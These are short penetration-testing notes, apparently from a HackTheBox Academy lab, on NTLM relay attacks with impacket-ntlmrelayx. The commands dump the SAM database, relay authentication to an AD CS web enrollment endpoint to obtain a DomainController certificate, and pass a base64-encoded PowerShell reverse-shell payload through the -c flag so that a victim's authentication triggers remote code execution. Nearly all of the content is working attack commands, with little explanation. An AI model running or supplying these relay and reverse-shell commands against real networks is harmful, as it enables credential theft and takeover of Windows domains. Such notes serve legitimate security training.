By default, `ntlmrelayx` dumps the SAM database
```shell-session
$ impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET-IP>
```
>NOTE: Make sure `SMB = Off` in Responder's config

```shell-session
$ sudo impacket-ntlmrelayx -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```
# Useful Flags
- `-c`: Execute commands

We can get Powershell reverse shell using [https://www.revshells.com](https://www.revshells.com/) (Powershell #3 (Base64)).
```shell-session
$ impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET-IP> -c 'powershell -e JABj...'
```
Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell.